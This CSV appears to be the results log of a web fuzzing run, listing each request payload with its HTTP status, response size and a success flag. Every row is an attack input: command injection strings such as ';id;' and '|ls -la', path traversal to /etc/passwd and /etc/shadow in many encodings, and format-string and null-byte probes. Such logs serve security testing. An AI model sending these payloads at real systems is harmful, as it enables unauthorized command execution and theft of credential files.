id,response,lines,word,chars,request,success
31,400,11,136,2060,\00\00\00,1
34,400,11,136,2050,`id`,1
39,400,11,136,2076,\nnetstat -a%\n,1
30,400,11,136,2054,\00\00,1
35,400,11,136,2052,`dir`,1
29,400,11,136,2048,\00,1
28,400,11,136,2054,\0\0\0,1
27,400,11,136,2050,\0\0,1
26,400,11,136,2046,\0,1
15,200,117,218,3435,-268435455,1
36,200,117,218,3435,;id;,1
25,200,117,218,3435,+%00,1
1,200,117,218,3435,A,1
3,200,117,218,3435,FALSE,1
7,200,117,218,3435,-1,1
38,200,117,218,3435,;netstat -a;,1
33,200,117,218,3435,$NULL,1
37,200,117,218,3435,;read;,1
32,200,117,218,3435,$null,1
22,400,11,136,2144,<  script > < / script>,1
20,400,11,136,2046,\0,1
21,400,11,136,2048,\00,1
24,200,117,218,3435,%00,1
23,200,117,218,3435,%0a,1
19,200,117,218,3435,null,1
16,200,117,218,3435,2147483647,1
13,200,117,218,3435,65536,1
18,200,117,218,3435,NULL,1
17,200,117,218,3435,0xfffffff,1
12,200,117,218,3435,-20,1
14,200,117,218,3435,268435455,1
11,200,117,218,3435,-2,1
40,400,11,136,2064,"\""blah",1
46,400,11,136,2050,|dir,1
10,200,117,218,3435,2,1
53,400,11,136,2092,\n/bin/ls -al\n,1
52,400,11,136,2086,|/bin/ls -al,1
9,200,117,218,3435,-1.0,1
6,200,117,218,3435,1,1
8,200,117,218,3435,1.0,1
2,200,117,218,3435,TRUE,1
5,200,117,218,3435,00,1
4,200,117,218,3435,0,1
44,400,11,136,2054,id%00|,1
45,400,11,136,2048,|id,1
49,400,11,136,2060,|ls -la,1
48,400,11,136,2048,|ls,1
47,400,11,136,2052,|dir|,1
42,200,117,218,3435,&quot;;id&quot;,1
57,400,11,136,2056,?x=>,1
55,400,11,136,2060,"?x=""",1
41,400,11,136,2050,|id|,1
54,200,117,218,3435,?x=,1
71,400,11,136,2224,/../../../../../../../../../../etc/passwd^^,1
50,200,117,218,3435,;ls -la,1
51,200,117,218,3435,;dir,1
43,200,117,218,3435,id%00,1
69,200,117,218,3435,../../../../../../../../../../../../etc/shadow%00,1
61,200,117,218,3435,/etc/shadow,1
62,400,11,136,2172,ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|,1
70,200,117,218,3435,../../../../../../../../../../../../etc/shadow,1
63,200,117,218,3435,../../../../../../../../../../../../etc/hosts%00,1
86,400,11,136,2130,\..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
67,200,117,218,3435,../../../../../../../../../../../../etc/passwd%00,1
68,200,117,218,3435,../../../../../../../../../../../../etc/passwd,1
66,200,117,218,3435,/../../../../../../../../%2A,1
58,400,11,136,2080,/index.html|id|,1
64,200,117,218,3435,../../../../../../../../../../../../etc/hosts,1
72,400,11,136,2224,/../../../../../../../../../../etc/shadow^^,1
65,200,117,218,3435,../../boot.ini,1
88,400,11,136,2128,..\..\..\..\..\..\..\..\..\..\etc\shadow%00,1
78,400,11,136,2124,\..\..\..\..\..\..\..\..\..\..\etc\shadow,1
85,400,11,136,2130,\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
56,400,11,136,2050,?x=|,1
87,400,11,136,2128,..\..\..\..\..\..\..\..\..\..\etc\passwd%00,1
60,200,117,218,3435,/etc/passwd,1
84,400,11,136,2178,.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow,1
59,200,117,218,3435,/boot.ini,1
80,400,11,136,2122,..\..\..\..\..\..\..\..\..\..\etc\shadow,1
81,400,11,136,2200,/..\../..\../..\../..\../..\../..\../etc/passwd,1
82,400,11,136,2200,/..\../..\../..\../..\../..\../..\../etc/shadow,1
83,400,11,136,2178,.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd,1
77,400,11,136,2124,\..\..\..\..\..\..\..\..\..\..\etc\passwd,1
79,400,11,136,2122,..\..\..\..\..\..\..\..\..\..\etc\passwd,1
74,200,117,218,3435,/../../../../../../../../../../etc/shadow,1
76,200,117,218,3435,/./././././././././././etc/shadow,1
75,200,117,218,3435,/./././././././././././etc/passwd,1
73,200,117,218,3435,/../../../../../../../../../../etc/passwd,1
91,200,117,218,3435,%00/etc/passwd%00,1
100,200,117,218,3435,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow,1
89,200,117,218,3435,%0a/bin/cat%20/etc/passwd,1
97,200,117,218,3435,/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd,1
98,200,117,218,3435,/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,1
99,200,117,218,3435,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd,1
96,200,117,218,3435,/../../../../../../../../../../../etc/passwd%00.html,1
94,200,117,218,3435,%00../../../../../../etc/shadow,1
93,200,117,218,3435,%00../../../../../../etc/passwd,1
95,200,117,218,3435,/../../../../../../../../../../../etc/passwd%00.jpg,1
106,400,11,136,2166,\\&apos;/bin/cat%20/etc/passwd\\&apos;,1
113,400,11,136,2064,C:\boot.ini,1
90,200,117,218,3435,%0a/bin/cat%20/etc/shadow,1
92,200,117,218,3435,%00/etc/shadow%00,1
102,200,117,218,3435,/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00,1
